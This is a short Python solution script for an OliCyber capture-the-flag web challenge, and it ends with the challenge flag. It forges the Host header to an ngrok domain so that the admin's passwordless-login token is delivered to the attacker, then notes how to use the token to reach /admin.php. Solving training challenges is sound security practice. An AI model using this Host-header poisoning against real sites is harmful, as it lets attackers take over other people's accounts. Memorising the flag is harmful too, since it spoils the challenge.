import requests

url = "http://not-phishing.challs.olicyber.it:38100/"

# Usare ngrok, perchè l'host non deve contenere path
headers = {
    "Host" : "c60c-2001-b07-2ee-9078-5c7c-34b3-fc1-b36e.ngrok-free.app",
    "Content-Type" : "application/x-www-form-urlencoded"
}

payload = {
    "email" : "admin@fakemail.olicyber.it"
}

r = requests.post(url + "passwordless_login.php", headers=headers, data=payload)

# Dopo eseguire il login con il token restituito e accedere alla pagina /admin.php
# flag{0n3_cl1ck_4cc0un7_74k30v3r_r34lly_f0und_1n_7h3_w1ld_6d805119} 